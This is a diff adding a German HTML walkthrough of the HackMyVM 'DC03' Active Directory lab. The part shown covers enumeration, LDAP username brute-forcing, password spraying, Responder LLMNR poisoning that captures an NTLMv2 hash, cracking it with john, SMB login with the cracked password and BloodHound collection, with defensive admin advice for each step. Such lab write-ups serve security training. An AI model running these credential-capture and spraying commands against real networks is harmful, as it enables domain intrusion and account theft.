@@ -1,0 +1,677 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DC03 - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>DC03 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nxc (netexec)</div>
+                <div class="tool-item">ldapnomnom</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">crackmapexec</div>
+                <div class="tool-item">snmpwalk</div>
+                <div class="tool-item">ping</div>
+                <div class="tool-item">Responder.py</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">neo4j (Service)</div>
+                <div class="tool-item">bloodhound-python</div>
+                <div class="tool-item">impacket-changepasswd</div>
+                <div class="tool-item">rpcclient</div>
+                <div class="tool-item">bloodyAD</div>
+                <div class="tool-item">wmiexec.py</div>
+                <div class="tool-item">evil-winrm</div>
+                <div class="tool-item">ls (Evil-WinRM)</div>
+                <div class="tool-item">cd (Evil-WinRM)</div>
+                <div class="tool-item">cat (Evil-WinRM)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance (AD Enumeration)</a></li>
+                <li><a href="#user-enum-brute">User Enumeration & Brute Force Attempts</a></li>
+                <li><a href="#llmnr-poisoning-hash-cracking">LLMNR Poisoning & Hash Cracking</a></li>
+                <li><a href="#smb-access-user-flag">SMB Access & User Flag</a></li>
+                <li><a href="#ad-enumeration-bloodhound">Active Directory Enumeration (BloodHound)</a></li>
+                <li><a href="#privesc-password-change">Privilege Escalation (Forced Password Change)</a></li>
+                <li><a href="#ntds-dump-pass-the-hash">NTDS Dump & Pass-the-Hash (Root Flag)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance (AD Enumeration)</h2>
+            <p class="comment">Die Erkundungsphase beginnt mit der Identifizierung des Ziels und einer ersten Analyse der exponierten Dienste, wobei ein Fokus auf Active Directory-spezifische Protokolle gelegt wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.116</span>	08:00:27:f6:27:cd	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der ARP-Scan identifiziert die IP-Adresse <span class="command">192.168.2.116</span>.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP für weitere Scans verwenden.
+            **Empfehlung (Admin):** Standard-Netzwerksicherheit.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+[...]
+<span class="command">192.168.2.116	dc03.hmv</span>
+                     </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Hostname `dc03.hmv` wird der IP <span class="command">192.168.2.116</span> in `/etc/hosts` zugeordnet.</p>
+            <p class="evaluation">**Bewertung:** Ermöglicht Adressierung über Hostnamen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Hostnamen nutzen.
+            **Empfehlung (Admin):** DNS-Management.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">enum4linux -a dc03.hmv</span></div>
+                    <pre>
+[...]
+ =( Enumerating Workgroup/Domain on dc03.hmv )=
+
+[+] Got domain/workgroup name: <span class="command">SUPEDECDE</span>
+
+ =( Nbtstat Information for dc03.hmv )=
+[...]
+	<span class="command">DC01</span>            <00> -         B <ACTIVE>  Workstation Service
+	<span class="command">SUPEDECDE</span>     <1c> - <GROUP> B <ACTIVE>  Domain Controllers
+	<span class="command">SUPEDECDE</span>     <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	DC01            <20> -         B <ACTIVE>  File Server Service
+	SUPEDECDE     <1b> -         B <ACTIVE>  Domain Master Browser
+[...]
+ =( Session Check on dc03.hmv )=
+
+<span class="password">[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** `enum4linux -a` versucht eine umfassende Enumeration. Es identifiziert erfolgreich den Domain/Workgroup-Namen `<span class="command">SUPEDECDE</span>` und den Hostnamen `<span class="command">DC01</span>` (wahrscheinlich der tatsächliche NetBIOS-Name des Controllers). Wichtig ist jedoch, dass der Server <span class="password">keine anonyme Session (Null Session) erlaubt</span>, was die weiteren Tests von `enum4linux` verhindert.</p>
+            <p class="evaluation">**Bewertung:** Wir kennen nun den Domain-Namen (`SUPEDECDE`) und den Hostnamen (`DC01`). Das Blockieren von Null Sessions ist eine grundlegende Sicherheitsmaßnahme, die die anonyme Enumeration erschwert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nmap verwenden, um offene Ports und Dienste detaillierter zu untersuchen. LDAP- und Kerberos-Enumeration mit Tools versuchen, die Authentifizierung ermöglichen oder bekannte Schwachstellen nutzen.
+            **Empfehlung (Admin):** Null Sessions sollten immer deaktiviert sein. Domain- und Hostnamen schützen, wenn möglich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.116 -p-</span></div>
+                     <pre>
+Starting Nmap 7.94SVN [...]
+Nmap scan report for dc03.hmv (192.168.2.116)
+Host is up [...]
+Not shown: 65518 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+<span class="command">53/tcp    open  domain?</span>
+<span class="command">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: [...])</span>
+<span class="command">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="command">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="command">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SUPEDECDE.LOCAL0., Site: Default-First-Site-Name)</span>
+<span class="command">445/tcp   open  microsoft-ds?</span>
+<span class="command">464/tcp   open  kpasswd5?</span>
+<span class="command">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="command">636/tcp   open  tcpwrapped</span> <span class="password">(LDAPS?)</span>
+<span class="command">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SUPEDECDE.LOCAL0., Site: Default-First-Site-Name)</span> <span class="password">(Global Catalog)</span>
+<span class="command">3269/tcp  open  tcpwrapped</span> <span class="password">(LDAPS Global Catalog?)</span>
+<span class="command">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span> <span class="password">(WinRM HTTP)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="command">9389/tcp  open  mc-nmf        .NET Message Framing</span> <span class="password">(ADWS?)</span>
+<span class="command">49664/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="command">49667/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="command">49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="command">49690/tcp open  msrpc         Microsoft Windows RPC</span>
+[...]
+Service Info: Host: <span class="command">DC01</span>; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+[...]
+| smb2-time:
+|   date: 2024-08-13T17:11:37
+|_  start_date: N/A
+|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f6:27:cd [...]
+| smb2-security-mode:
+|   3.1.1:
+|_    <span class="password">Message signing enabled and required</span> <span class="password">(SMB Signing!)</span>
+[...]
+                     </pre>
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap [...] | grep open</span></div>
+                     <pre>
+53/tcp    open  domain        Simple DNS Plus <span class="password">(Nmap Interpretation, wahrscheinlich AD DNS)</span>
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos [...]
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP [...]
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP [...]
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         Microsoft Windows RPC
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Nmap-Scan (`-sC`, `-sS`, `-sV`, `-A`, `-T5`, `-p-`) identifiziert eine Vielzahl offener Ports, die typisch für einen Windows Active Directory Domain Controller (DC) sind:
+             *   <span class="command">53 (DNS)</span>: Domain Name System.
+             *   <span class="command">88 (Kerberos)</span>: Authentifizierungsdienst.
+             *   <span class="command">135 (MSRPC)</span>: RPC Endpoint Mapper.
+             *   <span class="command">139, 445 (SMB/NetBIOS)</span>: Datei- und Druckerfreigabe, RPC über SMB.
+             *   <span class="command">389 (LDAP), 3268 (LDAP GC)</span>: Lightweight Directory Access Protocol (Verzeichnisdienst).
+             *   <span class="command">464 (KPASSWD)</span>: Kerberos Passwortänderung.
+             *   <span class="command">593, 49664, 49667, 49672, 49690 (MSRPC)</span>: Diverse RPC-Endpunkte.
+             *   <span class="command">636, 3269 (LDAPS?)</span>: Ports oft für LDAP über SSL/TLS verwendet (tcpwrapped deutet auf Filterung oder unbekanntes Protokoll hin).
+             *   <span class="command">5985 (WinRM HTTP)</span>: Windows Remote Management über HTTP.
+             *   <span class="command">9389 (ADWS?)</span>: Active Directory Web Services.
+             Nmap bestätigt den Hostnamen `DC01` und die Domain `SUPEDECDE.LOCAL`. Wichtig: SMB Signing ist aktiviert und erforderlich (`enabled and required`).</p>
+              <p class="evaluation">**Bewertung:** Das Ziel ist eindeutig ein Windows Domain Controller. Die große Anzahl offener AD-Dienste bietet viele potenzielle Angriffspunkte. Das erzwungene SMB Signing erschwert jedoch Angriffe wie SMB Relay.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** LDAP-Enumeration (Benutzer, Gruppen, Computer, GPOs) mit Tools wie `ldapsearch` oder spezialisierten AD-Tools (`ldapnomnom`, `BloodHound`) versuchen, auch wenn Null Session nicht geht (ggf. mit Default-Credentials oder nach Brute-Force). Kerberos-Enumeration (AS-REP Roasting, Kerberoasting) testen. WinRM (5985) auf mögliche Authentifizierung prüfen.
+              **Empfehlung (Admin):** Firewall-Regeln überprüfen, um nur notwendige Ports zu exponieren. SMB Signing ist eine gute Sicherheitsmaßnahme. LDAPS erzwingen. WinRM absichern.</p>
+         </section>
+
+         <section id="user-enum-brute">
+            <h2>User Enumeration & Brute Force Attempts</h2>
+            <p class="comment">Da Null Sessions blockiert sind, versuchen wir, Benutzer über LDAP zu enumerieren und anschließend Passwortangriffe durchzuführen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nxc smb 192.168.2.116 -u "" -p "" --shares</span></div>
+                     <pre>
+SMB         192.168.2.116   445    DC01             [] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SUPEDECDE.LCAL) (signing:True) (SMBv1:False)
+SMB         192.168.2.116   445    DC01             [-] SUPEDECDE.LCAL\: <span class="password">STATUS_ACCESS_DENIED</span>
+SMB         192.168.2.116   445    DC01             [-] Error getting user: list index out of range <span class="password">(Kein anonymer Zugriff)</span>
+SMB         192.168.2.116   445    DC01             [-] Error enumerating shares: Error occurs while reading from remote(104)
+                     </pre>
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">smbclient -L //192.168.2.116</span></div>
+                      <pre>
+Password for [WORKGROUP\root]: <span class="password"># Enter drücken (anonym)</span>
+<span class="password">session setup failed: NT_STATUS_ACCESS_DENIED</span>
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Versuche, mit `nxc` (netexec, Nachfolger von crackmapexec) und `smbclient` anonym Shares aufzulisten, scheitern wie erwartet mit `STATUS_ACCESS_DENIED`.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt, dass kein anonymer SMB-Zugriff möglich ist.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Benutzerenumeration über andere Protokolle (LDAP) versuchen.
+             **Empfehlung (Admin):** Anonymen SMB-Zugriff immer deaktivieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ldapnomnom -input /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -server dc03.hmv | tee users.txt</span></div>
+                     <pre>
+[...]
+<span class="command">charlie</span>
+<span class="command">Charlie</span>
+<span class="command">administrator</span>
+<span class="command">Administrator</span>
+<span class="command">CHARLIE</span>
+<span class="command">wreed11</span>
+<span class="command">kleo2</span>
+<span class="command">ChArLiE</span>
+<span class="command">CHarlie</span>
+<span class="command">xkate578</span> <span class="password"># Relevant?</span>
+[...]
+                     </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:** Wir verwenden `ldapnomnom`, ein Tool zur Benutzerenumeration über LDAP, das auch ohne Authentifizierung funktionieren kann (abhängig von der LDAP-Konfiguration). Wir geben eine große Wortliste mit Benutzernamen (`xato-net-10-million-usernames.txt`) an. Das Tool findet mehrere potenzielle oder bestätigte Benutzernamen, darunter `charlie`, `administrator` und `<span class="command">xkate578</span>`. Die Ergebnisse werden in `users.txt` gespeichert.</p>
+              <p class="evaluation">**Bewertung:** Erfolgreiche Benutzerenumeration über LDAP ohne Authentifizierung. Wir haben eine Liste potenzieller Benutzernamen für weitere Angriffe.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die gefundenen Benutzernamen für Passwort-Spraying oder Brute-Force-Angriffe gegen SMB oder Kerberos verwenden.
+              **Empfehlung (Admin):** Anonymen LDAP-Bind einschränken, wenn möglich. Nur authentifizierten Benutzern erlauben, Verzeichnisinformationen abzufragen.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nxc smb 192.168.2.116 -u users.txt -p users.txt --no-brute | grep -v -i Fail</span></div>
+                       <pre>
+SMB                      192.168.2.116   445    DC01             [] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SUPEDECDE.LCAL) (signing:True) (SMBv1:False)
+SMB                      192.168.2.116   445    DC01             [-] SUPEDECDE.LCAL\: <span class="password">STATUS_ACCESS_DENIED</span>
+SMB                      192.168.2.116   445    DC01             [-] SUPEDECDE.LCAL\: <span class="password">STATUS_ACCESS_DENIED</span>
+                       </pre>
+                       <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">crackmapexec smb dc03.hmv -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success --no-bruteforce | grep -v STATUS_LOGIN_FAILURE</span></div>
+                        <pre>
+SMB         192.168.2.116   445    DC01             [] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SUPEDECDE.LCAL) (signing:True) (SMBv1:False)
+<span class="password"># Keine Erfolgsmeldungen (+) angezeigt, nur Fehlversuche (implizit)</span>
+                        </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+              1.  Wir versuchen ein Passwort-Spraying mit `nxc`, wobei wir die Benutzerliste (`users.txt`) auch als Passwortliste verwenden (`-p users.txt`). `--no-brute` verhindert, dass alle Kombinationen probiert werden, es wird wahrscheinlich nur `user:user` getestet. Ergebnis: Kein Erfolg.
+              2.  Wir versuchen einen Brute-Force-Angriff mit `crackmapexec` (ältere Syntax, aber gleiches Tool wie `nxc`), verwenden die Benutzerliste `users.txt` und die Passwortliste `rockyou.txt`. Wir filtern fehlgeschlagene Logins (`STATUS_LOGIN_FAILURE`) heraus. Es werden keine erfolgreichen Logins angezeigt.</p>
+               <p class="evaluation">**Bewertung:** Standard-Passwortangriffe (Passwort-Spraying, Brute-Force mit RockYou) gegen SMB waren erfolglos.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Andere Angriffsvektoren prüfen: Kerberos (AS-REP Roasting, Kerberoasting), LLMNR/NBT-NS Poisoning, LDAP-Schwachstellen. SNMP prüfen.
+               **Empfehlung (Admin):** Starke Passwörter, Account Lockout Policies, Monitoring von fehlgeschlagenen Anmeldeversuchen.</p>
+         </section>
+
+         <section id="llmnr-poisoning-hash-cracking">
+              <h2>LLMNR Poisoning & Hash Cracking</h2>
+              <p class="comment">Da direkte Passwortangriffe scheiterten, versuchen wir, Credentials durch Man-in-the-Middle-Angriffe auf unsichere Namensauflösungsprotokolle wie LLMNR und NBT-NS zu erlangen. Wir verwenden Responder.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">snmpwalk -c public -v1 dc03.hmv</span></div>
+                        <pre><span class="password">Timeout: No Response from dc03.hmv</span></pre>
+                        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ping dc03.hmv</span></div>
+                        <pre>
+PING dc03.hmv (192.168.2.116) 56(84) bytes of data.
+64 bytes from dc03.hmv (192.168.2.116): icmp_seq=1 ttl=128 time=0.242 ms
+[...]
+                        </pre>
+                       <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 /usr/share/responder/Responder.py -I eth0</span></div>
+                       <pre>
+[...]
+           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
+[...]
+[+] Listening for events...
+[...]
+[*] [NBT-NS] Poisoned answer sent to 192.168.2.116 for name <span class="command">FILESERVER</span> (service: File Server)
+[*] [LLMNR]  Poisoned answer sent to [...] for name FileServer
+[*] [MDNS] Poisoned answer sent to [...] for name FileServer.local
+[...]
+<span class="password">[SMB] NTLMv2-SSP Client   : [...]</span>
+<span class="password">[SMB] NTLMv2-SSP Username : soupedecode\xkate578</span>
+<span class="password">[SMB] NTLMv2-SSP Hash     : xkate578:soupedecode:a2a...:[...]</span>
+[...]
+                       </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+              1.  Ein `snmpwalk` schlägt fehl (Timeout), SNMP ist also wahrscheinlich nicht aktiv oder nicht mit der Community `public` erreichbar.
+              2.  Ein `ping` bestätigt die Erreichbarkeit des Ziels.
+              3.  Wir starten `Responder.py` auf unserem Interface `eth0`. Responder lauscht auf LLMNR-, NBT-NS- und MDNS-Anfragen. Wenn ein Client im Netzwerk versucht, einen Hostnamen aufzulösen (z.B. `FILESERVER`) und DNS fehlschlägt, sendet er oft LLMNR/NBT-NS-Broadcasts. Responder fängt diese ab und behauptet, der gesuchte Host zu sein.
+              4.  Der DC (`192.168.2.116`) versucht, den Hostnamen `<span class="command">FILESERVER</span>` aufzulösen. Responder antwortet und leitet den DC an sich selbst um.
+              5.  Der DC versucht daraufhin, sich bei unserem Responder via SMB zu authentifizieren (wahrscheinlich um auf eine vermeintliche Dateifreigabe zuzugreifen).
+              6.  Responder fängt den NTLMv2-SSP-Hash des Benutzers `<span class="command">soupedecode\xkate578</span>` ab.</p>
+               <p class="evaluation">**Bewertung:** Erfolg! Wir haben erfolgreich einen LLMNR/NBT-NS Poisoning Angriff durchgeführt und einen NTLMv2-Hash für den Benutzer `xkate578` aus der Domain `soupedecode` erbeutet. Dieser Hash kann nun offline geknackt werden.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Den abgefangenen NTLMv2-Hash speichern und mit Tools wie `john` oder `hashcat` und einer Wortliste (z.B. `rockyou.txt`) versuchen zu knacken.
+               **Empfehlung (Admin):** LLMNR und NBT-NS im Netzwerk deaktivieren (über GPO). Netzwerksegmentierung kann die Reichweite solcher Angriffe begrenzen. Starke Passwörter verwenden, um das Knacken von Hashes zu erschweren.</p>
+
+               <div class="code-block">
+                    <div class="terminal">
+                         <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo 'xkate578:soupedecode:a2a...:[...]' > ntlm.hash</span></div> <span class="password"># Hash speichern</span>
+                         <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt ntlm.hash</span></div>
+                         <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">jesuschrist      (xkate578)</span>
+1g 0:00:00:00 DONE [...] 50.00g/s [...]
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+                         </pre>
+                     </div>
+                 </div>
+                 <p class="analysis">**Analyse:** Wir speichern den abgefangenen NTLMv2-Hash in der Datei `ntlm.hash`. Anschließend verwenden wir `john` mit der `rockyou.txt`-Wortliste, um den Hash zu knacken. John findet sehr schnell das zugehörige Passwort: `<span class="password">jesuschrist</span>` für den Benutzer `xkate578`.</p>
+                 <p class="evaluation">**Bewertung:** Kritischer Erfolg! Wir haben das Klartextpasswort für den Domänenbenutzer `xkate578` ermittelt.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):** Die Credentials (`xkate578`:`jesuschrist`) verwenden, um sich am Domain Controller anzumelden (z.B. via SMB, WinRM, LDAP) und weitere Informationen zu sammeln oder Berechtigungen zu prüfen.
+                 **Empfehlung (Admin):** LLMNR/NBT-NS deaktivieren. Starke, einzigartige Passwörter erzwingen, die nicht in gängigen Wortlisten enthalten sind.</p>
+         </section>
+
+         <section id="smb-access-user-flag">
+             <h2>SMB Access & User Flag</h2>
+             <p class="comment">Wir verwenden die geknackten Credentials, um auf SMB-Shares zuzugreifen und nach der User-Flag zu suchen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nxc smb 192.168.2.116 -u XKATE578 -p jesuschrist --shares</span></div>
+                     <pre>
+SMB         192.168.2.116   445    DC01             [] Windows Server 2022 Build 20348 x64 [...]
+SMB         192.168.2.116   445    DC01             [+] <span class="command">SUPEDECDE.LCAL\XKATE578</span>:<span class="password">jesuschrist</span>
+SMB         192.168.2.116   445    DC01             [] Enumerated shares
+SMB         192.168.2.116   445    DC01             Share           Permissions     Remark
+SMB         192.168.2.116   445    DC01             -----           -----------     ------
+SMB         192.168.2.116   445    DC01             ADMIN$                          Remote Admin <span class="password">(Kein Zugriff erwartet)</span>
+SMB         192.168.2.116   445    DC01             C$                              Default share <span class="password">(Kein Zugriff erwartet)</span>
+SMB         192.168.2.116   445    DC01             IPC$            READ            Remote IPC
+SMB         192.168.2.116   445    DC01             NETLOGON        READ            Logon server share
+SMB         192.168.2.116   445    DC01             <span class="command">share</span>           <span class="command">READ,WRITE</span>
+SMB         192.168.2.116   445    DC01             SYSVOL          READ            Logon server share
+                     </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:** Wir verwenden `nxc` mit den Credentials `XKATE578`:`jesuschrist`, um die Shares auf dem DC aufzulisten. Der Login ist erfolgreich. Wir sehen mehrere Standard-Shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) und einen benutzerdefinierten Share namens `<span class="command">share</span>`, auf den wir Lese- und Schreibrechte (`READ,WRITE`) haben.</p>
+              <p class="evaluation">**Bewertung:** Wir haben authentifizierten Zugriff auf den DC und einen beschreibbaren Share gefunden. Der `share`-Ordner ist unser nächstes Ziel.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Mit `smbclient` auf den `share`-Ordner verbinden und dessen Inhalt untersuchen. Nach der User-Flag oder anderen interessanten Dateien suchen.
+              **Empfehlung (Admin):** Berechtigungen für Shares genau prüfen und nur notwendigen Benutzern Zugriff gewähren. Prinzip der geringsten Rechte anwenden.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">smbclient '\\\\192.168.2.116\\share' -U SUPEDECDE.LCAL/XKATE578%jesuschrist</span></div>
+                      <pre>
+Try "help" to get a list of possible commands.
+smb: \> <span class="command">ls</span>
+  .                                  DR        0  Tue Aug 13 20:30:25 2024
+  ..                                  D        0  Thu Aug  1 07:38:08 2024
+  desktop.ini                       AHS      282  Thu Aug  1 07:38:08 2024
+  <span class="command">user.txt</span>                            A       70  Thu Aug  1 07:39:25 2024
+
+		12942591 blocks of size 4096. 10564230 blocks available
+smb: \> <span class="command">get user.txt</span>
+getting file \user.txt of size 70 as user.txt (7.6 KiloBytes/sec) (average 7.6 KiloBytes/sec)
+smb: \> exit
+                      </pre>
+                       <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat user.txt</span></div>
+                       <pre><span class="password">12f54a96f64443246930da001cafda8b</span></pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:** Wir verbinden uns erfolgreich mit `smbclient` zum `share`-Verzeichnis unter Verwendung der Domain (`SUPEDECDE.LCAL`), des Benutzernamens (`XKATE578`) und des Passworts (`jesuschrist`). Ein `ls`-Befehl zeigt eine Datei namens `user.txt`. Wir laden diese mit `get user.txt` herunter und lesen ihren Inhalt auf unserer lokalen Maschine mit `cat user.txt` aus.</p>
+                <p class="evaluation">**Bewertung:** User-Flag erfolgreich gelesen!</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Mit den vorhandenen Credentials versuchen, weitere Informationen über das Active Directory zu sammeln (z.B. mit BloodHound) oder nach Privesc-Möglichkeiten für `xkate578` zu suchen.
+                **Empfehlung (Admin):** Sensible Daten wie Flags nicht auf einfach zugänglichen Shares speichern.</p>
+         </section>
+
+         <section id="ad-enumeration-bloodhound">
+              <h2>Active Directory Enumeration (BloodHound)</h2>
+              <p class="comment">Mit gültigen Domain-Credentials können wir nun BloodHound verwenden, um Beziehungen und potenzielle Angriffspfade im Active Directory zu visualisieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"># <span class="command">(Neo4j Service Start - Annahme: Vorher installiert)</span></div>
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">apt install neo4j</span></div> <span class="password"># Falls nicht installiert</span>
+                      <pre>[...]</pre>
+                      <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">neo4j start</span></div>
+                      <pre>
+[...]
+Starting Neo4j.
+Started neo4j (pid:9566). It is available at http://localhost:7474
+[...]
+                      </pre>
+                       <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">bloodhound-python -u XKATE578 -p jesuschrist -d SUPEDECDE.LCAL -ns 192.168.2.116 -c all</span></div>
+                       <pre>
+WARNING: Could not find a global catalog server, assuming the primary DC has this role
+[...]
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. [...]
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Found 3 groups
+INFO: Found 3 users
+INFO: Found 5 GPOs
+INFO: Found 1 OUs
+INFO: Found 0 trusts
+INFO: Found 1 containers
+INFO: Found 2 sessions
+INFO: Found 0 GroupPolicyContainer objects
+INFO: Found 17 ACEs
+INFO: Collected 28 objects
+INFO: Done collecting data in 00:00:01
+INFO: Starting upload thread
+INFO: Upload thread finished, 0 items remaining
+INFO: Finished running collection, outputting JSON data...
+INFO: Found 28 objects, writing to JSON
+INFO: Wrote 3 groups to groups.json
+INFO: Wrote 3 users to users.json
+INFO: Wrote 2 computers to computers.json
+INFO: Wrote 1 domains to domains.json
+INFO: Wrote 1 gpos to gpos.json
+INFO: Wrote 1 ous to ous.json
+INFO: Wrote 1 containers to containers.json
+INFO: Wrote 0 trusts to trusts.json
+INFO: Finished writing JSON data
+INFO: Done in 00:00:01
+                       </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+              1.  Wir starten den Neo4j-Datenbankdienst, der von BloodHound benötigt wird.
+              2.  Wir führen `bloodhound-python` aus, den Datensammler für BloodHound.
+                  *   `-u XKATE578 -p jesuschrist`: Die gültigen Domain-Credentials.
+                  *   `-d SUPEDECDE.LCAL`: Der Domain-Name.
+                  *   `-ns 192.168.2.116`: Der Name Server / Domain Controller.
+                  *   `-c all`: Sammelt alle verfügbaren Informationstypen (Gruppenmitgliedschaften, Sessions, ACLs etc.).
